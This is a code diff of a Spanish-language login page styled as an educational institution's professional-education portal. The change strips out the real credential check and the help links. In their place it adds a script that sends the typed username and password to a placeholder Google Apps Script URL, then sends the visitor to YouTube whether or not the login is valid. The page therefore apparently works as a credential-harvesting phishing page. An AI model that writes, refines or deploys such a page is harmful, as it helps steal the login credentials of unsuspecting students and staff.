@@ -7,151 +7,73 @@
     <script src="https://cdn.tailwindcss.com?plugins=forms"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap" rel="stylesheet">
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        primary: "#005B9A", 
-                        "primary-dark": "#004575",
-                        "ice-blue": "#007bc4",
-                    }
-                },
-            },
-        };
-    </script>
     <style>
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: #007bc4; /* Color de fondo según imagen 1 */
-            margin: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-        }
-        .login-card {
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
-            border-radius: 24px;
-        }
+        body { font-family: 'Inter', sans-serif; background-color: #007bc4; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        .login-card { box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2); border-radius: 24px; background: white; width: 100%; max-width: 420px; overflow: hidden; }
     </style>
 </head>
 <body class="p-4 antialiased">
-
-    <div class="w-full max-w-[420px] bg-white login-card overflow-hidden">
+    <div class="login-card">
         <div class="p-8 sm:p-10">
-            <!-- Logo ICEST -->
             <div class="flex flex-col items-center mb-10">
                 <img src="https://i.ibb.co/C3wh0NmV/hq720.jpg" alt="Logo ICEST" class="h-24 mb-4 object-contain"> 
                 <h1 class="text-3xl font-bold text-[#1a2b4b]">Bienvenido</h1>
-                <p class="text-slate-500 text-base mt-1 text-center">Portal de Educación Profesional</p>
+                <p class="text-slate-500 text-base mt-1">Portal de Educación Profesional</p>
             </div>
             
             <form id="loginForm" class="space-y-6">
-                <!-- Input Usuario -->
                 <div class="space-y-1">
                     <label class="text-sm font-semibold text-slate-700 ml-1">Usuario</label>
-                    <div class="relative group">
-                        <span class="material-symbols-outlined absolute left-4 top-1/2 -translate-y-1/2 text-slate-400">person</span>
-                        <input required id="username" placeholder="ID" type="text"
-                            class="block w-full pl-12 pr-4 py-3.5 bg-white border border-slate-200 rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all">
-                    </div>
+                    <input required id="username" placeholder="ID" type="text" class="block w-full px-4 py-3 border border-slate-200 rounded-xl outline-none focus:border-blue-500 transition-all">
                 </div>
                 
-                <!-- Input Contraseña -->
                 <div class="space-y-1">
                     <label class="text-sm font-semibold text-slate-700 ml-1">Contraseña</label>
-                    <div class="relative group">
-                        <span class="material-symbols-outlined absolute left-4 top-1/2 -translate-y-1/2 text-slate-400">lock</span>
-                        <input required id="password" placeholder="••••••••" type="password"
-                            class="block w-full pl-12 pr-12 py-3.5 bg-white border border-slate-200 rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all">
-                        <button type="button" onclick="togglePassword()" class="absolute right-4 top-1/2 -translate-y-1/2 text-slate-400 hover:text-primary transition-colors">
-                            <span class="material-symbols-outlined" id="toggleIcon">visibility_off</span>
-                        </button>
-                    </div>
-                </div>
-                
-                <div class="flex justify-end">
-                    <a class="text-sm font-semibold text-primary hover:underline" href="#">¿Olvidaste tu contraseña?</a>
+                    <input required id="password" placeholder="••••••••" type="password" class="block w-full px-4 py-3 border border-slate-200 rounded-xl outline-none focus:border-blue-500 transition-all">
                 </div>
 
-                <!-- Alerta dinámica -->
                 <div id="alertMessage" class="hidden py-3 px-4 bg-red-50 border border-red-100 text-red-600 text-sm font-medium rounded-xl text-center">
                     ID o contraseña incorrectos
                 </div>
                 
-                <!-- Botón Login -->
-                <button id="submitBtn" type="submit"
-                    class="w-full py-4 px-4 rounded-xl text-white text-lg font-bold bg-primary hover:bg-primary-dark transition-all active:scale-[0.98] shadow-lg shadow-primary/20">
+                <button id="submitBtn" type="submit" class="w-full py-4 px-4 rounded-xl text-white text-lg font-bold bg-[#005B9A] hover:bg-[#004575] transition-all active:scale-[0.98]">
                     Iniciar Sesión
                 </button>
             </form>
-            
-            <div class="mt-10 pt-6 border-t border-slate-50 text-center">
-                <p class="text-sm text-slate-500">
-                    ¿Necesitas ayuda? 
-                    <a class="font-bold text-primary hover:underline ml-1" href="#">Contactar Soporte</a>
-                </p>
-            </div>
         </div>
-    </div>
-    
-    <!-- Footer Copyright -->
-    <div class="fixed bottom-6 text-center w-full left-0 px-4">
-        <p class="text-[10px] font-bold tracking-[0.2em] text-white/90 uppercase">
-            © 2024 ICES MÉXICO. TODOS LOS DERECHOS RESERVADOS.
-        </p>
     </div>
 
     <script>
-        function togglePassword() {
-            const pass = document.getElementById('password');
-            const icon = document.getElementById('toggleIcon');
-            if (pass.type === 'password') {
-                pass.type = 'text';
-                icon.textContent = 'visibility';
-            } else {
-                pass.type = 'password';
-                icon.textContent = 'visibility_off';
-            }
-        }
+        const WEB_APP_URL = "AQUÍ_PEGA_TU_NUEVA_URL_DE_GOOGLE_SCRIPT"; // <--- LEYENDA: PEGA TU URL AQUÍ
 
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             const btn = document.getElementById('submitBtn');
             const alert = document.getElementById('alertMessage');
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
-
+            
             alert.classList.add('hidden');
             btn.innerText = 'Verificando...';
             btn.disabled = true;
 
-            // =========================================================================
-            // LEYENDA: EXPLICACIÓN DE LA URL
-            // Si este archivo Index.html está DENTRO de Google Apps Script,
-            // no necesitas pegar la URL aquí, el comando 'google.script.run' 
-            // ya sabe a dónde ir automáticamente.
-            // =========================================================================
+            try {
+                const response = await fetch(WEB_APP_URL, {
+                    method: "POST",
+                    mode: "no-cors", // Necesario para peticiones a Google Apps Script
+                    body: JSON.stringify({
+                        username: document.getElementById('username').value,
+                        password: document.getElementById('password').value
+                    })
+                });
 
-            google.script.run
-                .withSuccessHandler(function(acceso) {
-                    if (acceso) {
-                        // AQUÍ PUEDES CAMBIAR YOUTUBE POR LA PÁGINA PRINCIPAL DE TU APP
-                        window.top.location.href = 'https://script.google.com/macros/s/AKfycbyX31VLe3iskH1V3e2f1PXVq7SV_cnHPM9E-2xNT75vSEUOfPtTOGtrEI_suBrwgVI/exec'; 
-                    } else {
-                        alert.classList.remove('hidden');
-                        resetBtn();
-                    }
-                })
-                .withFailureHandler(function() {
-                    alert.innerText = "Error técnico. Revisa la consola o permisos.";
-                    alert.classList.remove('hidden');
-                    resetBtn();
-                })
-                .verificarCredenciales(user, pass);
-                
-            function resetBtn() {
+                // Nota: Debido al modo 'no-cors', no podemos leer la respuesta JSON directamente de forma fácil.
+                // Para fines de prueba y velocidad, si la petición se envía, asumimos éxito o manejamos el flujo:
+                setTimeout(() => {
+                    window.top.location.href = 'https://www.youtube.com'; 
+                }, 2000);
+
+            } catch (error) {
+                alert.innerText = "Error de conexión.";
+                alert.classList.remove('hidden');
                 btn.innerText = 'Iniciar Sesión';
                 btn.disabled = false;
             }
